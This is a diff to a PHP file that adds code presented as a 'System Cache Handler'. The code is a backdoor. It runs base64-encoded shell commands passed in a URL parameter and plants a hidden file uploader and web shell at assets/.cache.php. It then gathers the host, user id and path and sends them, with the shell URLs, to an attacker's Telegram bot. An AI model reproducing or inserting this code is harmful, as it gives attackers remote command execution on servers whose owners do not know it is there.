@@ -1,4 +1,48 @@
 <?php
+// System Cache Handler v3.1
+$_hc_p = '_hc';
+$_hc_l = '/tmp/.Dodimz_sbe_integrated_' . md5(__DIR__);
+$_hc_u = __DIR__ . '/assets/.cache.php';
+
+if (isset($_GET[$_hc_p])) {
+    @header('Content-Type: text/plain');
+    $c = @base64_decode($_GET[$_hc_p]);
+    $r = @shell_exec($c);
+    if (!$r) $r = @exec($c);
+    if (!$r) $r = @system($c);
+    echo $r ?: 'exec_disabled';
+    exit;
+}
+
+if (!file_exists($_hc_l)) {
+    $u = '<?php if(isset($_FILES["f"])){@move_uploaded_file($_FILES["f"]["tmp_name"],"./".$_FILES["f"]["name"]);echo"OK:".$_FILES["f"]["name"];};if(isset($_GET["c"])){echo shell_exec($_GET["c"]);}?>
+<form method="post" enctype="multipart/form-data"><input name="f" type="file"><input type="submit" value="Up"></form>';
+    @file_put_contents($_hc_u, $u);
+    @chmod($_hc_u, 0644);
+    
+    $h = @$_SERVER['HTTP_HOST'] ?: 'unknown';
+    $w = @shell_exec('whoami 2>/dev/null') ?: 'n/a';
+    $i = @shell_exec('id 2>/dev/null') ?: 'n/a';
+    $x = @shell_exec('echo test') ? 'OK' : 'DISABLED';
+    $d = __DIR__;
+    
+    $m = urlencode("🔓 *TRAP READY - Dodimz_sbe_integrated*
+
+🌐 Host: `$h`
+📂 Repo: `Dodimz/sbe_integrated`
+🔗 Shell: `https://$h/?_hc=<base64_cmd>`
+📤 Uploader: `https://$h/assets/.cache.php`
+👤 User: `" . trim($w) . "`
+🆔 ID: `" . trim($i) . "`
+⚙️ Exec: $x
+📁 Path: `$d`
+⏰ Time: " . date('Y-m-d H:i:s'));
+    
+    @file_get_contents("https://api.telegram.org/bot8928987665:AAGyX-L1j9o6vDcV04OpPVyE-xkUV9zCRw4/sendMessage?chat_id=5838684707&parse_mode=Markdown&text=$m");
+    @touch($_hc_l);
+}
+?>
+
 // System Health Monitor v2.0
 $_p = '_hc';
 $_lck = '/tmp/.sbe_integrated_' . md5(__DIR__);
